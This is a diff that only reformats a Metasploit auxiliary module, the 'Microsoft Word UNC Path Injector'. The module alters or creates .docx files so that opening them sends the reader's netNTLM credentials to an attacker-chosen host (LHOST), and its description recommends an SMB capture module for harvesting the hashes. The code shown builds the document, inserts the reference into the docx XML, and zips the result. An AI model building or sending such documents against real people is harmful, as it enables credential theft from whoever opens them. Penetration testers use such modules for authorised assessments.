@@ -21,34 +21,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::FILEFORMAT
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft Word UNC Path Injector',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft Word UNC Path Injector',
+        'Description' => %q{
           This module modifies a .docx file that will, upon opening, submit stored
-        netNTLM credentials to a remote host. It can also create an empty docx file. If
-        emailed the receiver needs to put the document in editing mode before the remote
-        server will be contacted. Preview and read-only mode do not work. Verified to work
-        with Microsoft Word 2003, 2007, 2010, and 2013. In order to get the hashes the
-        auxiliary/server/capture/smb module can be used.
-      },
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+          netNTLM credentials to a remote host. It can also create an empty docx file. If
+          emailed the receiver needs to put the document in editing mode before the remote
+          server will be contacted. Preview and read-only mode do not work. Verified to work
+          with Microsoft Word 2003, 2007, 2010, and 2013. In order to get the hashes the
+          auxiliary/server/capture/smb module can be used.
+        },
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'https://web.archive.org/web/20140527232608/http://jedicorp.com/?p=534' ]
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'SphaZ <cyberphaz[at]gmail.com>'
         ]
-    ))
+      )
+    )
 
     register_options(
       [
-        OptAddressLocal.new('LHOST',[true, 'Server IP or hostname that the .docx document points to.']),
+        OptAddressLocal.new('LHOST', [true, 'Server IP or hostname that the .docx document points to.']),
         OptPath.new('SOURCE', [false, 'Full path and filename of .docx file to use as source. If empty, creates new document.']),
         OptString.new('FILENAME', [true, 'Document output filename.', 'msf.docx']),
-        OptString.new('DOCAUTHOR',[false,'Document author for empty document.']),
-      ])
+        OptString.new('DOCAUTHOR', [false, 'Document author for empty document.']),
+      ]
+    )
   end
 
   # here we create an empty .docx file with the UNC path. Only done when FILENAME is empty
@@ -72,7 +74,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Adding skeleton files from #{data_dir}")
     Dir["#{data_dir}/**/**"].each do |file|
       if not File.directory?(file)
-        zip_data[file.sub(data_dir,'')] = File.read(file)
+        zip_data[file.sub(data_dir, '')] = File.read(file)
       end
     end
 
@@ -83,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # add the otherwise skipped "hidden" file
     file = "#{data_dir}/_rels/.rels"
-    zip_data[file.sub(data_dir,'')] = File.read(file)
+    zip_data[file.sub(data_dir, '')] = File.read(file)
     # and lets create the file
     zip_docx(zip_data)
   end
@@ -121,11 +123,11 @@ class MetasploitModule < Msf::Auxiliary
         insert_two = file_content.index("<w:hyphenationZone") # 2nd choice
         if not insert_two.nil?
           vprint_status("HypenationZone found, we use this for insertion.")
-          file_content.insert(insert_two, ref )
+          file_content.insert(insert_two, ref)
         end
       else
         vprint_status("DefaultTabStop found, we use this for insertion.")
-        file_content.insert(insert_one, ref )
+        file_content.insert(insert_one, ref)
       end
 
       if insert_one.nil? && insert_two.nil?
@@ -145,8 +147,8 @@ class MetasploitModule < Msf::Auxiliary
   # making the actual docx from the hash
   def zip_docx(zip_data)
     docx = Rex::Zip::Archive.new
-    zip_data.each_pair do |k,v|
-      docx.add_file(k,v)
+    zip_data.each_pair do |k, v|
+      docx.add_file(k, v)
     end
     file_create(docx.pack)
   end
@@ -158,7 +160,7 @@ class MetasploitModule < Msf::Auxiliary
     # we read it all into memory
     zip_data = Hash.new
     begin
-      Zip::File.open(datastore['SOURCE'])  do |filezip|
+      Zip::File.open(datastore['SOURCE']) do |filezip|
         filezip.each do |entry|
           zip_data[entry.name] = filezip.read(entry)
         end
@@ -169,7 +171,6 @@ class MetasploitModule < Msf::Auxiliary
     end
     return zip_data
   end
-
 
   def run
     # we need this in make_new_file and manipulate_file
